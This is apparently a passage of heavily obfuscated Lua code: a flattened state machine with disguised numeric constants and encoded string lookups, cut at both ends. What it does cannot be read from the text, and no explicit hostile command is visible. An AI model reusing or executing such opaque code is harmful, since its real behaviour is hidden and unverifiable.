Z=q[R]R={Z(q6)}B={J(R)}R=B B=n[h]B=B and 541020+15410029 or-1012183+8669820 end end else if B<-161384+3289636 then if B<-308454+3395709 then i=X(-144483+199097)B=n[I[880768-880767]]f=n[I[-515953-(-515955)]]a=n[I[-520415+520418]]U=2419747334200-(-334894)m=a(i,U)D=f[m]f=l(11310118-(-822716),{I[792798-792796],I[657959+-657956];I[718689-718685];I[110661-110656]})Z=B(D,f)B=-917639+15890725 else B=-694752+13316545 end else B=n[I[-641452+641459]]T=B(V)B=976784+11656335 end end end end else if B<4166630-448011 then if B<2681796-(-785260)then if B<2713219-(-541751)then if B<2179377-(-1016351)then if B<-957862+4144062 then m=n[I[-821936-(-821937)]]B=1017924+15745633 V=X(-50257+104995)i=n[I[997327+-997325]]f=X(637574+-582925)T=-532077+9296917491542 f=D[f]U=i(V,T)a=m[U]f=f(D,a)Z=f else A=nil B=q[X(-581792+636705)]Z={}end else if B<2211788-(-1012014)then m=nil i=nil B=-812108+12501192 else B=n[I[617924+-617918]]Z=B(D)B=6773843-(-987705)end end else if B<-167102+3447874 then if B<3191722-(-79424)then i=X(463027+-408310)s=449027+22741697351514 m=q[i]B=7426216-(-668309)P=X(5653+49176)U=n[I[660919+-660918]]V=n[I[-134389-(-134391)]]T=V(P,s)i=U[T]T=X(64870+-10263)a=m[i]i=n[I[-931855+931856]]P=-720565+18457828384840 U=n[I[-760894-(-760896)]]V=U(T,P)m=i[V]f=a[m]i=n[I[-469489-(-469490)]]P=976467+24695946118808 a=X(32284-(-22365))U=n[I[573124+-573122]]T=X(-330496-(-385034))V=U(T,P)m=i[V]a=f[a]a=a(f,m)A=a else F=X(926936-872251)x=6172338339008-(-872058)s=n[I[-794201-(-794203)]]H=n[I[176641+-176638]]g=H(F,x)c=6013138466646-109670 P=s[g]T=U[P]H=n[I[-372678-(-372680)]]g=n[I[-611813+611816]]x=X(260476+-206007)F=g(x,c)B=1813167-60474 s=H[F]P=X(431665-377016)P=T[P]P=P(T,s)V=P end else U=X(463177-408507)a=n[I[-148537-(-148538)]]m=n[I[666697-666695]]V=870082+34268115089299 B=-394960+10888123 i=m(U,V)f=a[i]D=X(-1032783+1087677)D=A[D]D=D(A,f)Z=D end end else if B<-627045+4252824 then if B<-658232+4188737 then if B<3029950-(-473381)then Z=X(874735-819735)B=q[Z]m=n[I[-604337+604341]]i={B(m)}f=i[899280+-899278]a=i[-253693+253696]B=585309+7705343 Z=i[-553469-(-553470)]m=Z else D=nil B=76305+1924509 end else if B<2521215-(-1046403)then B=n[I[-598858-(-598861)]]i=X(-737138-(-791625))T=X(-160680+215669)U=-300634+7139108184918 f=n[I[-408309+408310]]a=n[I[-749991+749993]]m=a(i,U)D=f[m]P=-589267+22553743320793 m=X(81294+-26829)a=q[m]i=n[I[339793+-339792]]U=n[I[-944948+944950]]V=U(T,P)m=i[V]U=-955541+955541 f=a[m]m=527202+-526947 i=-817999+818254 a={f(m,i,U)}Z=B(A,D,J(a))B=17251+10429214 else f=B i=X(-725865+780582)m=q[i]s=-314894+20394235245350 P=X(-114076-(-168837))U=n[I[717968+-717966]]V=n[I[199674+-199671]]T=V(P,s)i=U[T]a=m[i]U=n[I[-463367-(-463369)]]s=14102873933838-(-446873)P=X(333066-278086)V=n[I[146372+-146369]]m=X(-681782-(-736431))T=V(P,s)i=U[T]m=a[m]m=m(a,i)B=m and 416996+8789295 or-503080+9578919 D=m end end else if B<2761784-(-954073)then if B<299017+3399734 then Z={}A=nil B=q[X(377497+-322850)]else a,U=m(f,a)B=a and 9875091-717053 or 9118560-428580 end else a=X(240581+-186044)Z=q[a]m=n[I[742142-742141]]i=n[I[761014-761012]]V=X(-239311-(-294259))T=-584955+3704267928503 U=i(V,T)s=-735071+9177561204752 a=m[U]V=X(-401287-(-456164))B=Z[a]m=n[I[172410+-172409]]i=n[I[-817008+817010]]T=32901207722459-658947 U=i(V,T)a=m[U]Z=B(a)a=Z U=X(-278971-(-333466))Z=n[I[775588-775587]]V=11947560221242-107647 m=n[I[357067-357065]]i=m(U,V)T=15465574150102-431029 V=X(-728279-(-783015))B=Z[i]m=n[I[-125225+125226]]i=n[I[470384-470382]]U=i(V,T)Z=m[U]a[B]=Z U=X(-683141+737864)Z=n[I[-40055-(-40056)]]m=n[I[375223-375221]]V=23784860362180-440961 P=X(368213-313316)i=m(U,V)B=Z[i]i=X(-646034-(-700731))m=q[i]U=n[I[964035+-964034]]V=n[I[-445345-(-445347)]]T=V(P,s)i=U[T]V=-139454-(-139454)U=72187+-72087 T=1038911+-1038881 Z=m[i]i=-989452-(-989452)m=Z(i,U,V,T)V=-823628+6046237826123 a[B]=m Z=n[I[-396986-(-396987)]]m=n[I[-870295-(-870297)]]U=X(690260-635332)P=-232288+34978070498047 i=m(U,V)B=Z[i]Z=true T=X(-521519-(-576314))a[B]=Z U=X(542583+-487944)Z=n[I[233043+-233042]]m=n[I[591257-591255]]V=11425888745334-189102 i=m(U,V)B=Z[i]Z=A a[B]=Z Z=n[I[47173+-47172]]U=X(-753298-(-808187))V=22648362953578-98872 m=n[I[495146+-495144]]i=m(U,V)B=Z[i]Z=A a[B]=Z m=X(-771715+826252)Z=q[m]i=n[I[489360+-489359]]U=n[I[602184-602182]]V=U(T,P)s=X(-64294+119240)m=i[V]B=Z[m]T=X(-637387+692056)i=n[I[-360401-(-360402)]]U=n[I[506647+-506645]]P=1229402989802-(-73042)V=U(T,P)m=i[V]Z=B(m)T=313225+5373160145469 m=Z V=X(411372-356897)Z=n[I[-755221+755222]]i=n[I[401574+-401572]]U=i(V,T)H=21943063786564-248922 B=Z[U]U=X(784776+-730079)i=q[U]V=n[I[210917-210916]]T=n[I[787807+-787805]]P=T(s,H)U=V[P]Z=i[U]P=-8598-(-8598)U=-966584-(-966585)V=55588+-55588 T=516483+-516482 i=Z(U,V,T,P)H=1995263107284-(-500429)m[B]=i V=X(70421+-15886)T=-366493+32392602423944 Z=n[I[-843489+843490]]i=n[I[-877381-(-877383)]]U=i(V,T)s=X(-217826+272382)B=Z[U]Z=401706-401705 U=X(-284188-(-338942))m[B]=Z i=q[U]V=n[I[-637698+637699]]T=n[I[-238879-(-238881)]]P=T(s,H)U=V[P]Z=i[U]P=X(830847+-776301)U=n[I[-106034+106035]]V=n[I[-505440-(-505442)]]s=23726528609412-987484 T=V(P,s)i=U[T]B=Z[i]i=B U=i V=B B=i and-955428+1337234 or 572877+7889195 end end end else if B<561183+3273842 then if B<-787216+4541012 then if B<419209+3308814 then if B<-792969+4520459 then U=nil B=14013954-590645 i=nil a=nil else D=nil B=15337430-364344 end else if B<977096+2773502 then B=518149+5438096 V=P o=X(333920-279135)t=q[o]o=X(22285-(-32394))c=t[o]t=c(A,V)c=n[I[999392-999386]]o=c()x=t+o F=x+i x=965741+-965485 g=F%x i=g V=nil o=-424252-(-424253)x=f[D]t=i+o c=a[t]F=x..c f[D]=F else A=S()D=S()n[A]=k[439725+-439724]n[D]=k[-714102-(-714104)]Z=n[I[616377-616376]]f=n[A]B=Z[f]B=B and-1010449+1845413 or 11916049-662081 end end else if B<-748499+4538626 then if B<4260498-486320 then B=15798704-(-134844)U=nil i=nil V=nil else B=n[I[101778-101777]]f=n[I[-439381-(-439383)]]a=n[I[-33762-(-33765)]]i=X(687932+-633094)U=23618090813745-532027 m=a(i,U)D=f[m]f=b(1859962-(-635091),{I[92147-92145],I[781449-781446];I[-890998+891002]})Z=B(D,f)B=729936+3157222 end else s=577038+10483157517571 i=X(1102032-1047315)m=q[i]U=n[I[-10666-(-10667)]]V=n[I[263226+-263224]]P=X(1005020-950346)B=946354+9895040 T=V(P,s)i=U[T]T=X(-768906-(-823588))a=m[i]P=438273+19370339906363 i=n[I[-113352+113353]]U=n[I[-401565+401567]]V=U(T,P)m=i[V]f=a[m]a=X(48672+5977)P=8149176691528-859254 i=n[I[235553+-235552]]T=X(819941-765324)a=f[a]U=n[I[215205+-215203]]V=U(T,P)m=i[V]a=a(f,m)A=a end end else if B<3788561-(-155772)then if B<-544335+4437574 then if B<475460+3393949 then s=925128+26215245304295 P=X(-928263+982920)f=B i=X(564014+-509297)m=q[i]U=n[I[-956119+956121]]V=n[I[846285-846282]]T=V(P,s)i=U[T]P=X(1098029-1043327)a=m[i]U=n[I[257831+-257829]]s=-309510+29890902814565 V=n[I[-576692+576695]]m=X(-14937-(-69586))T=V(P,s)i=U[T]m=a[m]m=m(a,i)B=m and-632579+1034035 or 467230+5863276 D=m else B=q[X(-70976+125755)]Z={}A=nil end else if B<349546+3578108 then B=q[X(-734411-(-789040))]A=nil Z={}else U=142301+4640362060947 i=X(288756+-234025)B=n[I[899061-899056]]f=n[I[-3336-(-3338)]]a=n[I[-55255+55258]]m=a(i,U)D=f[m]Z=B(D)B=4391332-483473 end end else if B<3807053-(-203841)then if B<4488026-492932 then P=X(-816203-(-870669))a=B U=n[I[-807537-(-807539)]]s=-373998+13736262143466 V=n[I[577123-577120]]T=V(P,s)i=U[T]m=D[i]f=m B=m and 5898797-429074 or 15873932-(-546627)else A=nil Z={}B=q[X(-536463-(-591216))]end else e=524447-524441 o=-845805+845806 B=n[U]t=B(o,e)e=X(-536026-(-590566))B=X(587256+-532716)q[B]=t o=q[e]e=-984105+984107 B=o>e B=B and 16161230-(-377137)or 10090897-(-213018)end end end end end end else if B<-380012+6818748 then if B<-983006+6452262 then if B<5883616-1012592 then if B<4172687-(-208481)then if B<3745499-(-363864)then if B<5008869-943251 then if B<-591513+4621587 then m[P]=s B=H s=n[I[-65551-(-65552)]]F=X(544208+-489476)H=n[I[717772-717770]]e=34241738904206-(-682939)x=-436250+6615204787234 g=H(F,x)o=X(1030284-975751)P=s[g]s=1029428.5-1029428 m[P]=s s=n[I[-485334+485335]]B=q[X(264227+-209408)]x=55262+13758565974312 H=n[I[-635048+635050]]Z={a}F=X(-290327+345130)g=H(F,x)F=X(-160107-(-214668))P=s[g]g=q[F]x=n[I[-749815+749816]]c=n[I[666890-666888]]t=c(o,e)o=-647688+18562765112267 F=x[t]t=X(-233913-(-288863))H=g[F]F=n[I[334964+-334963]]x=n[I[-838550-(-838552)]]c=x(t,o)g=F[c]s=H[g]m[P]=s F=X(-275149-(-329655))x=29224140316589-567941 s=n[I[992286+-992285]]H=n[I[-241770+241772]]g=H(F,x)P=s[g]s=true x=-815876+22842228219024 m[P]=s s=n[I[862054+-862053]]F=X(425281+-370290)H=n[I[-405083-(-405085)]]g=H(F,x)P=s[g]s=a m[P]=s else Z=n[I[-805990+805991]]a=X(766167-711255)m=15204316593305-909553 D=n[I[117047-117045]]f=D(a,m)B=Z[f]Z=-286404+286405 A[B]=Z a=X(970025+-915256)Z=n[I[558042-558041]]m=35064075829772-918085 D=n[I[537859+-537857]]f=D(a,m)B=Z[f]Z=false A[B]=Z B=-37888+9684261 end else if B<3351481-(-728796)then a,U=m(f,a)B=a and 12252564-(-381574)or 16449166-(-85374)else B=-901935+3015909 s=n[I[86977-86976]]F=X(-620019-(-674702))H=n[I[-987811-(-987813)]]x=1169970964248-861432 g=H(F,x)P=s[g]T=X(149752+-95103)T=U[T]T=T(U,P)Z=T end end else if B<295408+3976266 then if B<-506760+4635216 then m=nil B=566309-(-287090)i=nil U=nil else B=f B=16918230-750874 Z=D end else if B<3805094-(-513873)then Z=n[I[773950+-773949]]A=n[I[380564+-380562]]B=Z[A]B=B and 726323+12860882 or 821421+10668356 else A=Z B=A and 2849658-578190 or 19971+3990612 end end end else if B<3770690-(-959323)then if B<3572386-(-999827)then if B<5363623-835137 then B=X(422477-367828)a=n[I[264805+-264804]]U=X(-1026979+1081913)V=610861+3218178782125 m=n[I[-450429+450431]]i=m(U,V)B=A[B]Z=a[i]B=B(A,Z)B=B and 143041+2397632 or 829778+2888231 else T=Y(454436+4946930,{})a=X(998604+-944096)Z=X(878350-823509)B=q[Z]V=X(-70356-(-125261))A=n[I[-799577-(-799581)]]f=q[a]U=q[V]V={U(T)}i={J(V)}U=-311706+311708 m=i[U]a=f(m)f=X(760781-705804)D=A(a,f)A={D()}Z=B(J(A))A=Z D=n[I[539793+-539788]]B=D and 832740+-683286 or-534305+15147988 Z=D end else if B<-445131+5096082 then f=X(-633700+688417)V=378165+26277915224727 D=q[f]a=n[I[-29184+29185]]m=n[I[34435-34433]]U=X(628586+-574006)i=m(U,V)f=a[i]B=16936996-743045 A=D[f]a=n[I[-665791-(-665792)]]V=811550+7520228453263 U=X(687745-633180)m=n[I[798237-798235]]i=m(U,V)D=X(724277+-669628)D=A[D]f=a[i]D=D(A,f)Z=D else U=279722+15073539626689 B=n[I[-595082+595087]]f=n[I[590256+-590254]]a=n[I[154966+-154963]]i=X(-801385-(-855963))m=a(i,U)D=f[m]Z=B(D)f=X(-703704+758421)D=q[f]m=n[I[-501393+501395]]T=-716348+10709174256054 i=n[I[-755696-(-755699)]]V=X(-13194+67828)U=i(V,T)f=X(-885953-(-940602))f=D[f]a=m[U]f=f(D,a)B=f and-409070+509033 or 16419045-251689 Z=f end end else if B<4140824-(-714361)then if B<3826046-(-960271)then T=X(-666968-(-721542))D=B m=X(-32508+87225)a=q[m]P=21157845066904-769564 i=n[I[-40186-(-40187)]]U=n[I[212931-212929]]V=U(T,P)m=i[V]f=a[m]i=n[I[958303-958302]]U=n[I[327712-327710]]P=11409958133125-559300 T=X(76792-22047)V=U(T,P)a=X(-148366-(-203015))a=f[a]m=i[V]a=a(f,m)A=a B=a and-931423+17161860 or 826397+10634 else A=nil B=q[X(17552+37253)]Z={}end else a=-163024+163025 m=-45083-(-45085)D=n[I[46115+-46114]]f=D(a,m)D=-1022576+1022577 A=f==D B=A and 457975+11451464 or 14511051-(-277810)Z=A end end end else if B<5020784-(-339954)then if B<4503934-(-659457)then if B<-637819+5552054 then if B<3845404-(-1033274)then B=12863852-(-559457)else Z={}A=nil B=q[X(771317+-716772)]end else if B<282591+4704075 then B=9349763-(-558498)m=nil U=nil i=nil else F=x p=F B=-514372+9824524 g[F]=p F=nil end end else if B<5898369-613304 then if B<5128951-(-137646)then B=b(7474947-891746,{a})t={B()}B=q[X(1003146-948309)]Z={J(t)}else B=D B=14235294-938083 Z=A end else x=825561+20236288281590 c=169421+5407083983880 s=n[I[752819+-752817]]H=n[I[1004520+-1004517]]F=X(574700-519755)g=H(F,x)P=s[g]T=U[P]x=X(-156227+210872)P=X(-170105+224754)H=n[I[-710434+710436]]g=n[I[863794-863791]]B=1148420-(-233409)P=T[P]F=g(x,c)s=H[F]P=P(T,s)V=P end end else if B<189909+5228491 then if B<6413565-1027725 then if B<5040146-(-329340)then A=k[436962-436961]B=A and 7532151-(-1046847)or-708020+2072769 else m=f P=n[I[63517-63516]]F=-1003650+10757745271827 s=n[I[-150492-(-150494)]]g=X(568066+-513233)H=s(g,F)T=P[H]V=X(104240+-49591)V=i[V]V=V(i,T)B=V and 15263026-550928 or 180984+11398353 U=V end else if B<942006+4458888 then B=X(260686-205751)B=D[B]B=B(D)B=341697+2593194 else Z=9969785-(-158081)f=819932+3496691 D=X(-682337-(-736879))A=D^f B=Z-A A=B Z=X(771188-716717)B=Z/A Z={B}B=q[X(845276-790413)]end end else if B<900514+4566022 then if B<-487656+5948402 then D=B m=X(681904-627187)a=q[m]i=n[I[723540-723539]]U=n[I[-206204-(-206206)]]P=20906146642969-448018 T=X(-22279-(-77106))V=U(T,P)P=29234444064787-(-498970)m=i[V]T=X(-218906+273707)f=a[m]i=n[I[302288-302287]]a=X(191056+-136407)U=n[I[670066-670064]]a=f[a]V=U(T,P)m=i[V]a=a(f,m)B=a and 5733510-(-251747)or 11812261-30643 A=a else B=n[I[-54865+54872]]B=B and 729897+481249 or 13223556-(-528406)end else B=D Z=A B=470465+2460666 end end end end else if B<6607446-629041 then if B<-141281+5934081 then if B<5622536-(-33150)then if B<-809924+6315748 then if B<5707489-228235 then U=n[I[270737+-270735]]s=-944460+11769864634036 H=28831665936019-614946 V=n[I[265346+-265343]]P=X(-1739-(-56680))T=V(P,s)i=U[T]s=X(216073+-161297)m=D[i]V=n[I[-466705-(-466707)]]T=n[I[-1015646-(-1015649)]]i=X(427295-372595)P=T(s,H)U=V[P]i=m[i]i=i(m,U)f=i B=956968+15463591 else B=n[I[-625208+625214]]F=X(-578184+632934)s=n[I[559960+-559958]]x=-888869+21519291791177 H=n[I[-371088-(-371091)]]g=H(F,x)P=s[g]T=U[P]V=B(T)B=-893949+9533861 end else if B<1033351+4608490 then P=n[I[-810250+810251]]B=7690213-397162 g=X(-320426-(-375313))s=n[I[-194713-(-194715)]]F=992165+7212318402937 x=-646524+33884352486174 H=s(g,F)F=X(279432+-224575)T=P[H]V=i[T]s=n[I[-406136+406137]]H=n[I[-378932+378934]]g=H(F,x)P=s[g]T=X(-446836-(-501485))T=V[T]T=T(V,P)U=T else i=X(963446+-908633)B=n[I[-612521+612522]]f=n[I[-621018+621020]]a=n[I[-849300-(-849303)]]U=18391721494803-(-104545)m=a(i,U)D=f[m]f=Y(8121903-(-229837),{I[43135+-43133],I[-531529+531532];I[249522-249518]})Z=B(D,f)B=-357661+4001791 end end else if B<4891098-(-891121)then if B<6159437-432730 then Z={}B=q[X(130516+-75941)]A=nil else D=B m=X(642879-588162)a=q[m]i=n[I[106321+-106320]]U=n[I[-967516-(-967518)]]P=-802223+32376712984723 T=X(107142-52154)V=U(T,P)T=X(451165-396634)m=i[V]P=-365425+31227589151806 f=a[m]i=n[I[129017-129016]]a=X(629057+-574408)U=n[I[-176383+176385]]a=f[a]V=U(T,P)m=i[V]a=a(f,m)A=a B=a and-102304+3902038 or-364547+11205941 end else a,U=m(f,a)B=a and 680552+7680458 or 1652492-1029424 end end else if B<5620073-(-332057)then if B<5092068-(-772365)then if B<6685368-833238 then Z={}A=nil B=q[X(-406113+460957)]else D=Z B=D and 614155+6779787 or-283412+3798737 end else if B<5794528-(-125018)then U=5803318131763-717221 B=n[I[215573-215572]]i=X(569380-514681)f=n[I[-41915+41917]]a=n[I[7662+-7659]]m=a(i,U)D=f[m]f=M(-455095+15998127,{I[-331190+331192];I[-127491+127494],I[389897+-389893]})Z=B(D,f)B=-104804+2105618 else U=n[I[861968-861966]]H=20235296548129-(-81837)P=X(-555578-(-610525))s=321795+19985897093975 V=n[I[440804-440801]]B=12564480-673479 T=V(P,s)i=U[T]s=X(702526-647703)m=D[i]V=n[I[-964467+964469]]T=n[I[191161+-191158]]P=T(s,H)U=V[P]i=X(-490539-(-545239))i=m[i]i=i(m,U)f=i end end else if B<6446755-486027 then if B<239343+5716887 then a,U=m(f,a)B=a and 766724+12885624 or-244512+12093117 else P=P+s V=P<=T g=not H V=g and V g=P>=T g=H and g V=g or V g=3319161-(-409116)B=V and g V=-540569+4267934 B=B or V end else B=15835529-7775 a=X(-234126-(-288843))f=q[a]V=X(628231+-573363)m=n[I[1013863+-1013861]]T=17457365678318-(-354003)i=n[I[30117+-30114]]U=i(V,T)a=m[U]T=15309693931157-(-396612)V=X(991311-936541)D=f[a]m=n[I[175220-175218]]i=n[I[951881-951878]]f=X(-745692+800341)f=D[f]U=i(V,T)a=m[U]f=f(D,a)Z=f end end end else if B<-277968+6567466 then if B<-502745+6642389 then if B<6961771-882242 then if B<-664314+6660423 then i=X(843043+-788326)m=q[i]s=-594230+7205850816081 P=X(665961+-611336)U=n[I[732691-732690]]V=n[I[-380596-(-380598)]]T=V(P,s)B=12144308-362690 i=U[T]P=-672347+28015797974352 a=m[i]i=n[I[-955822-(-955823)]]U=n[I[-7972+7974]]T=X(-335695+390546)V=U(T,P)m=i[V]f=a[m]a=X(-647643-(-702292))i=n[I[965995+-965994]]a=f[a]U=n[I[449352-449350]]T=X(-106054-(-161020))P=15666346162681-(-533126)V=U(T,P)m=i[V]a=a(f,m)A=a else B=Z and 10399151-(-491952)or 324618+9347399 end else if B<839448+5287483 then A=k[-513151+513152]B=A and-339011+11450577 or 5457506-(-998343)else x=28758169301206-(-279417)P=X(217618-163153)B=n[I[-790137-(-790140)]]T=q[P]s=n[I[-991172+991173]]H=n[I[218984-218982]]F=X(390979-336195)g=H(F,x)P=s[g]H=-386940+387195 V=T[P]s=-394951-(-395206)P=395867+-395636 T={V(P,s,H)}U=B(i,J(T))B=8166449-816020 end end else if B<5381625-(-825736)then if B<490760+5683835 then B=n[I[730901+-730895]]Z=B(D)B=7986807-(-857729)else B=n[I[39809-39802]]T=B(V)B=409746+3364402 end else h=G(h)R=nil d=G(d)C=G(C)L=G(L)p=G(p)w=G(w)B=736281+-733425 end end else if B<5347905-(-983896)then if B<5323166-(-997351)then if B<6182998-(-128894)then D=X(1040867+-986150)V=805063+13723559759919 A=q[D]a=n[I[-643318+643319]]m=n[I[-151526+151528]]U=X(-932894+987506)i=m(U,V)D=X(745486+-690837)D=A[D]f=a[i]D=D(A,f)Z=D B=D and 10228116-334881 or 509671+14015867 else B=n[I[145366-145363]]s=n[I[362555+-362554]]H=n[I[812446+-812444]]x=-635556+30648156088931 F=X(459651+-404886)g=H(F,x)F=X(-483119+537915)P=s[g]T=i[P]x=927261+11804917968732 s=n[I[-1038178+1038179]]H=n[I[870841-870839]]g=H(F,x)P=s[g]s=X(834358+-779893)V=T[P]P=q[s]H=n[I[-983761+983762]]x=X(811907+-756991)g=n[I[-843051+843053]]c=12267215713580-(-352548)F=g(x,c)s=H[F]H=411714+-411539 T=P[s]g=-192235+192490 s=1014968-1014713 P={T(s,H,g)}U=B(V,J(P))B=-418479+10173232 end else if B<223148+6106444 then D=Z B=D and 13144596-1009646 or 725818+3001768 else Z=D B=f B=768676+1986314 end end else if B<6169372-(-228927)then if B<5385358-(-967562)then V=X(-827502+882337)a=X(160139+-105385)T=25074673646297-(-717507)f=q[a]m=n[I[103523-103522]]i=n[I[427813-427811]]U=i(V,T)a=m[U]V=-902865+12435012001135 Z=f[a]a=n[I[521891+-521890]]m=n[I[-3164+3166]]U=X(-678162+733018)i=m(U,V)f=a[i]B=Z[f]f=B a=f m=B B=f and 15519783-521239 or 2395854-665704 else Z=D B=f B=13685902-203041 end else Z=X(540046-485097)A=X(281168+-226386)B=q[Z]Z=B(A)Z={}B=q[X(-570718+625603)]end end end end end else if B<8605993-898313 then if B<6486362-(-709095)then if B<45043+6714700 then if B<-524161+7109828 then if B<7506343-1023935 then if B<5405852-(-1043567)then Z=D B=f B=12833856-1048314 else T=-464274+1717307791537 V=X(451196+-396605)i=X(-851861+906507)U=7643501892171-(-736156)B=n[I[-802699+802704]]f=n[I[-1005689-(-1005691)]]a=n[I[354827+-354824]]m=a(i,U)D=f[m]f=X(-384108+438825)Z=B(D)D=q[f]m=n[I[-923677-(-923679)]]i=n[I[211075+-211072]]f=X(-412177+466826)U=i(V,T)a=m[U]f=D[f]f=f(D,a)Z=f B=f and 14062939-994542 or 494098+11026250 end else if B<6572136-5846 then B=true B=B and 12635292-976061 or 9484272-79026 else B=-956458+7512002 end end else if B<7137727-485509 then if B<850961+5750134 then B=a T=X(-883943+938694)i=X(244480-189921)f[B]=Z Z=n[I[-107378-(-107379)]]U=90021+4329787959355 a=n[I[-997975+997977]]P=34799217227959-(-67221)m=a(i,U)B=Z[m]m=X(-963924+1018389)a=q[m]i=n[I[185374-185373]]U=n[I[917788-917786]]V=U(T,P)m=i[V]Z=a[m]i=356171-356171 m=-934496-(-934496)U=-399133+399133 a=Z(m,i,U)f[B]=a i=X(205405+-150615)Z=n[I[3764-3763]]U=21754315178917-121875 a=n[I[907799-907797]]m=a(i,U)B=Z[m]Z=A U=-1002783+33926357961429 i=X(-892366-(-947103))f[B]=Z Z=n[I[-600232+600233]]a=n[I[-862137-(-862139)]]m=a(i,U)B=Z[m]Z=A f[B]=Z Z={f}B=q[X(-910956-(-965470))]else i=X(-969334-(-1024293))B=n[I[67338+-67333]]f=n[I[944154+-944152]]T=-199737+18903086935707 U=7909067855351-(-489579)a=n[I[-13553+13556]]m=a(i,U)D=f[m]Z=B(D)f=X(-676303+731020)D=q[f]m=n[I[-685824+685826]]f=X(-171586-(-226235))i=n[I[1018716-1018713]]V=X(-844086-(-898734))f=D[f]U=i(V,T)a=m[U]f=f(D,a)Z=f B=f and 14082225-(-102810)or 976125+4880861 end else if B<5959937-(-755063)then B=-999880+4713926 i=nil U=nil else U=X(-890240-(-945173))a=n[I[-703115-(-703116)]]V=86005428515-782587 m=n[I[654063-654061]]i=m(U,V)f=a[i]D=A[f]Z=D B=3202002-1000374 end end end else if B<251023+6801902 then if B<591321+6200002 then if B<7034630-251372 then f,i=a(D,f)B=f and 472442+7725765 or 8510902-(-170705)else B=X(570194-515545)B=D[B]B=B(D,U)V=B i=a B=V and 13224+6193398 or-66758+3840906 end else if B<6530590-(-409709)then B=q[X(-359313+414203)]Z={}A=nil else A=k[991839-991838]Z=A B=A and-1044369+4343819 or 710643+9782520 end end else if B<525948+6596802 then if B<730041+6359586 then D=X(95556+-40569)B=n[I[-222515-(-222516)]]D=B[D]D=D(B)B=nil n[I[549377+-549376]]=B B=8317062-(-393388)else A=k[-361596+361597]B=A and-455366+1571013 or 337647+15994645 end else B=n[I[340660-340655]]U=33629061997965-714850 f=n[I[588194-588192]]a=n[I[397994-397991]]i=X(-561554-(-616102))m=a(i,U)D=f[m]Z=B(D)f=X(678724+-624007)V=X(430108+-375299)D=q[f]T=-434963+12374158653845 m=n[I[886375-886373]]i=n[I[-857287+857290]]U=i(V,T)a=m[U]f=X(240758+-186109)f=D[f]f=f(D,a)B=f and-197707+1756319 or-728542+16130564 Z=f end end end else if B<-75936+7493832 then if B<8129354-799746 then if B<-997753+8289199 then if B<8282645-1036241 then P=23237037028539-363127 D=B T=X(94615+-40052)m=X(99070-44353)a=q[m]i=n[I[841266-841265]]U=n[I[-385439+385441]]V=U(T,P)P=-765984+3789023049476 m=i[V]T=X(986701-932061)f=a[m]i=n[I[757057+-757056]]a=X(330152+-275503)a=f[a]U=n[I[526260-526258]]V=U(T,P)m=i[V]a=a(f,m)B=a and-658722+3925481 or 8329215-234690 A=a else s=n[I[179175-179174]]H=n[I[810371+-810369]]F=X(465840+-411323)x=30629438767238-(-341808)g=H(F,x)P=s[g]H=D g=B B=D and 11584739-(-84387)or 519351+8683850 end else if B<6551378-(-741401)then A=k[-911946-(-911947)]B=A and 6305250-387736 or 5895437-(-716628)else B=U and-307965+6626959 or-229316+9984069 end end else if B<6618168-(-772931)then if B<-158775+7511996 then i=nil m=nil B=435570+8535190 else B=X(66331+-11396)B=A[B]B=B(A)B=-177965+12361841 end else Z=X(730414-675627)B=q[Z]i=X(-986226+1041000)i=D[i]m={i(D)}i={B(J(m))}Z=i[574461-574460]a=i[-314112+314115]f=i[-845644+845646]m=Z B=-1038141+14326290 end end else if B<6684422-(-859143)then if B<-502305+7993279 then if B<7898842-455973 then B=n[I[-584208+584211]]U=-364887+13624364689951 f=n[I[791901+-791900]]P=979058+881513615656 i=X(-894193+949101)a=n[I[-915735-(-915737)]]m=a(i,U)D=f[m]T=X(-995529+1050347)m=X(-767624+822089)a=q[m]i=n[I[1030384+-1030383]]U=n[I[-755020+755022]]V=U(T,P)m=i[V]f=a[m]m=464346-464091 i=-472984-(-472984)U=-712335-(-712335)a={f(m,i,U)}Z=B(A,D,J(a))B=12521297-692139 else B=-651656+4379242 end else if B<149659+7363376 then B=q[X(-969853-(-1024308))]A=nil Z={}else D=nil B=-233463+4120621 end end else if B<8533141-878386 then if B<-591268+8174624 then D=X(-172179-(-226896))V=24279124592435-(-124150)A=q[D]D=X(445663-391014)D=A[D]U=X(861660-807051)a=n[I[303885-303884]]m=n[I[590793-590791]]i=m(U,V)f=a[i]D=D(A,f)Z=D B=D and 6255247-473997 or 391160+1374848 else f=X(394037+-339145)D=q[f]f=X(-473142-(-527718))A=D[f]f=n[I[586312-586311]]B=q[X(896976+-842154)]D={A(f)}Z={J(D)}end else z=n[D]B=z and 816205+319843 or 14734719-51955 q6=z end end end end else if B<479536+7826973 then if B<687153+7300348 then if B<-101227+7912216 then if B<7167506-(-586586)then if B<8276051-562154 then D=nil B=443982+5215230 else A=k[-547663-(-547664)]B=A and 6864107-110473 or 778665+1422963 Z=A end else if B<7625427-(-135563)then m=f B=X(-406880-(-461529))B=A[B]B=B(A,i)U=B B=U and 2634388-226529 or 4918557-(-61092)else D=nil B=-13978+3658108 end end else if B<-358066+8227906 then if B<-185055+8002419 then i=X(-638624-(-693428))U=17523364675252-499413 B=n[I[651634+-651630]]f=n[I[-859510+859512]]a=n[I[504797-504794]]m=a(i,U)D=f[m]Z=B(D)B=8258898-(-463932)else Z=D B=f B=408864+14993158 end else B=10306627-891597 end end else if B<738465+7431215 then if B<-151220+8243894 then if B<406430+7662606 then D=k[479778+-479776]A=k[-801282+801283]f=not A B=f and 678721+5397408 or 14452456-(-169764)Z=f else B=q[X(54374+438)]Z={}end else if B<-287926+8427933 then Z=A B=D B=16977894-448300 else U=nil d=S()F={}f=nil g=nil U=X(228856+-174102)x=S()L=X(-525448+580132)h=X(295279+-240513)e=M(11264841-(-572912),{x;T,P,m})s=nil N=nil n[x]=F g=-971318+31043537373869 F=S()i=nil n[F]=e R=X(286928-232232)p={}e={}V=nil m=G(m)m=X(-797795+852588)n[d]=e e=q[L]C=n[d]w={[h]=C,[R]=N}L=e(p,w)e=M(-52029+2105475,{d;x,H,T;P,F})T=G(T)n[D]=L H=G(H)P=G(P)x=G(x)F=G(F)n[a]=e d=G(d)F=-246238+31904560020454 f=q[m]i=q[U]h=907938+4476193615234 H=X(688179-633677)T=n[D]P=n[a]s=P(H,g)V=T[s]T=X(389026-334388)T=i[T]U={T(i,V)}m=f(J(U))V=X(-788877-(-843631))g=X(-900042+954576)i=X(-484740-(-539533))f=m()d=-24327+26451170037540 